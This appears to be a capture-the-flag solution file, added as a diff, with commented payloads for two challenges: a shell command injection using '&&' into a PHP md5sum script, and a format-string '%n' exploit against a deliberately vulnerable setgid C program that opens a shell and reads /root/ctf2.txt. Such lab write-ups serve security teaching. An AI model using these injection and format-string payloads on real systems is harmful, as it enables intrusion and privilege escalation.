@@ -1,0 +1,88 @@
+#
+# The PHP file runs the following command
+# echo <user input> | md5sum
+# By using && for separating multiple commands, we can
+# make the PHP script run whatever commands we want.
+# We use the echo command ran by PHP to output some HTML
+# elements to format our output better, then cat the ctf1.txt
+# file to find out what we should do next. We also echo the closing
+# statements for out fancy HTML tags, and give a new line to the
+# md5sum command.
+#
+"<pre><code>" && cat ctf1.txt && echo "</code></pre>" && echo
+
+This is the first flag. Using escape shell chars is nice, isn't it?
+
+You have one more flag. In order to take it, do the following steps:
+   (1) use the attacker/attacker credentials on the attacked machine
+   (2) run the ctf2 executable 
+   (3) exploit its vulnerability; it can help looking at its code in "/var/www/html/ctf2.c"
+   (4) display the contents of the file "/root/ctf2.txt" 
+Good luck!
+
+#
+# Same as above, but we show the source code of the ctf2 executable.
+# We can already see that ctf2 uses the first argument passed from
+# CLI in the printf statement. printf is exploitable for writing stuff
+# on the stack.
+#
+"<pre><code>" && cat ctf2.c && echo "</code></pre>" && echo
+
+#include 
+#include 
+#include 
+
+int secret = 0;
+
+void give_shell(){
+    gid_t gid = getegid();
+    setresgid(gid, gid, gid);
+    system("/bin/sh -i");
+}
+
+int main(int argc, char **argv){
+    int *ptr = &secret;
+    printf(argv[1]);
+
+    if (secret == 1337){
+        give_shell();
+    }
+    return 0;
+}
+
+#
+# This is a bit more complicated
+# The format specifier %n will write the number of characters
+# written until now to the argument of the printf call.
+# Our printf call has no arguments, so data will be written
+# over other stack contents.
+#
+# I used python for formatting a string that has 1337 characters
+# print('%08x' * n + 'x' * (1337 - 8 * n) + '%n')")
+#       |        |   |                  |   ^^^^
+#       |        |   |                  |   Final nail in the coffin, write the number of
+#       |        |   |                  |   characters written until now on the stack.
+#       |        |   |                  |   By using %x * n at the beginning we advanced the
+#       |        |   |                  |   stack pointer of the printf function by 32 bits * n,
+#       |        |   |                  |   hopefully getting to the pointer of the secret
+#       |        |   |                  |   variable, so we can write to it
+#       |        |   ^^^^^^^^^^^^^^^^^^^^
+#       |        |   Print some random garbage until we get to 1337 characters
+#       |        |   remember, we've already written 8 * n characters
+#       ^^^^^^^^^^
+#       Print some data from the stack, formatted in 8 characters
+#       %x takes an int as parameter, so this will be 32bits on most systems
+#       (makes it easier to calculate how many characters we need to write)
+#
+#
+# By running the ctf2 executable with the output produced when python runs the
+# above code, the secret pointer will have its value assigned to 1337.
+# This will make the check pass, privileges will be escalated, and an interactive shell
+# will be opened. To take advantage of the shell, just pipe what you want to run
+# into the ctf2 program. We want to print the ctf2.txt file.
+#
+"<pre><code>" && echo "cat /root/ctf2.txt" | ctf2 "$(python -c "print('%08x' * 6 + 'x' * (1337 - 8 * 6) + '%n')")" 2>&1 && echo "</code></pre>" && echo
+
+/bin/sh: 0: can't access tty; job control turned off
+# This is the second flag. It is not difficult to exploit format strings, isn't it?
+# 
